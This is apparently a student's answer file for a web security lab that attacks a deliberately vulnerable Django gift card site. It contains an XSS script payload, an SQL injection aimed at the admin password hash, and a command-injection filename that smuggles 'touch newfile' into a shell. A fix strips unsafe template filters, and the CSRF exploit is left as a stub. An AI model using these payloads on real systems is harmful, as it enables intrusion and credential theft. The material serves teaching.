# %%
# w2d4_answers.py

import os
import sys
import django
import io
import unittest
import json
import re
import contextlib
import time
import shutil
import stat
import inspect

# Setup Django environment
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "GiftcardSite.settings")
django.setup()

from django.test import TestCase, Client
from django.db import connection
from LegacySite.models import Card, User
from django.template import engines

from django.test import TransactionTestCase
from django.core.management import call_command

# %%

"""
Exploit XSS vulnerability by injecting malicious script into director parameter.

Args:
    None

Returns:
    bool: True if XSS payload was successfully injected, False otherwise
"""


def exploit_xss_vulnerability():
    from django.conf import settings

    # Add testserver to ALLOWED_HOSTS if not already there
    if "testserver" not in settings.ALLOWED_HOSTS:
        settings.ALLOWED_HOSTS.append("testserver")

    client = Client()
    # TODO: Create XSS payload and test vulnerable endpoint
    # - Create a malicious JavaScript payload
    # - Replace the current response endpoint with the vulnerable one

    xss_payload = "<script>alert('XSS')</script>"
    endpoint = "/buy/1"
    vulnerable_endpoint = f"/buy/1?director={xss_payload}"
    response = client.get(vulnerable_endpoint)

    print(f"XSS exploit response status: {response.status_code}")

    if response.status_code == 200:
        response_content = response.content.decode()
        if xss_payload in response_content:
            print("[+] XSS vulnerability successfully exploited!")
            print(f"[+] Malicious payload found in response: {xss_payload}")
            return True
        else:
            print("[-] XSS payload not found in response (may be escaped)")
            return False
    else:
        print(f"[-] Request failed with status {response.status_code}")
        return False


from w2d4_test import test_exploit_xss_vulnerability

test_exploit_xss_vulnerability(exploit_xss_vulnerability)

# %%

"""
Fix XSS vulnerability by finding discepencies.
You can do it manually or edit the front end code.

Args:
    None
    
Returns:
    None
"""


def fix_xss_vulnerability():
    files = ["templates/gift.html", "templates/item-single.html"]

    for file in files:
        path = file
        pattern = r"\|\s*safe\b"

        with open(path, "r") as f:
            content = f.read()

        cleaned = re.sub(pattern, "", content)

        with open(path, "w") as f:  # Changed to "w" mode for writing
            f.write(cleaned)


fix_xss_vulnerability()

"""
from w2d4_test import test_fix_xss_vulnerability

print("\nTesting XSS vulnerability fix...")
test_fix_xss_vulnerability(fix_xss_vulnerability)

"""
# %%


def exploit_csrf_vulnerability():
    """
    Create malicious HTML that exploits CSRF vulnerability.

    Args:
        None

    Returns:
        str: HTML content that performs the CSRF attack
    """
    # TODO: Create malicious HTML that performs CSRF attack
    # - Create an HTML page that appears legitimate
    # - Include a hidden form targeting the gift card endpoint
    # - Add JavaScript to automatically submit the form
    # - Give user "test2" a gify card
    return "<html><body><h1>CSRF Vulnerability</h1></body></html>"


# %%


def exploit_sql_injection_vulnerability():
    """
    Create SQL injection payload for card signature processing.

    Args:
        None

    Returns:
        bytes: JSON-encoded card data with malicious SQL injection payload to reveal admin password hash
    """
    # TODO: Create malicious card with SQL injection payload
    payload = "SELECT password FROM LegacySite_user WHERE username = admin"
    # - Create a payload that breaks out of the original query
    card = {
        "merchant_id": "GPT-4 API Credits",
        "customer_id": "katie",
        "total_value": "4",
        "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": payload}],
    }
    # - Target admin credentials from the database
    return card


from w2d4_test import test_exploit_sql_injection_vulnerability

test_exploit_sql_injection_vulnerability(exploit_sql_injection_vulnerability)

# %%


def exploit_cmd_injection_vulnerability():
    """
    Create command injection payload for filename processing.

    Args:
        None

    Returns:
        dict: POST parameters including malicious filename and malformed JSON
    """

    malicious_filename = "nonexistent; touch newfile; #"

    malformed_json = '{"merchant_id": "AI Art Generator Tokens","customer_id": "test2", "total_value": 100,"records": [{"record_type": "amount_change","amount_added": 100,,"signature": "\' OR \'1\'=\'1"}]}'

    post_params = {
        "card_supplied": "True",
        "card_fname": malicious_filename,
        # Use malformed JSON that will trigger a JSON decode error
        "card_data": malformed_json.encode("utf-8"),
    }

    return post_params or {}


from w2d4_test import test_exploit_cmd_injection_vulnerability

if __name__ == "__main__":
    test_exploit_cmd_injection_vulnerability(exploit_cmd_injection_vulnerability)
